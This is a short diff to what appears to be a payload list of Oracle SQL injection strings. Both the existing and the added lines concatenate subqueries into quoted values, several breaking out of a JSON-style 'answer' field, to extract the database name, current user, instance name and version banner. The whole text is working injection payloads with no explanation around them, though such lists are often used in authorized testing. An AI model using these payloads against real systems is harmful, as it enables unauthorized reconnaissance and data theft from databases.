@@ -2,3 +2,7 @@
 'hacked' || (SELECT name FROM v$database) || '
 'hacked' || (SELECT user FROM dual) || '
 'hacked' || (SELECT instance_name FROM v$instance) || '
+"answer\":\"'||(SELECT sys_context('USERENV', 'DB_NAME') FROM dual)||'"
+"answer\":\"'||(SELECT user FROM dual)||'"
+"answer\":\"'||(SELECT banner FROM v$version WHERE rownum=1)||'"
+
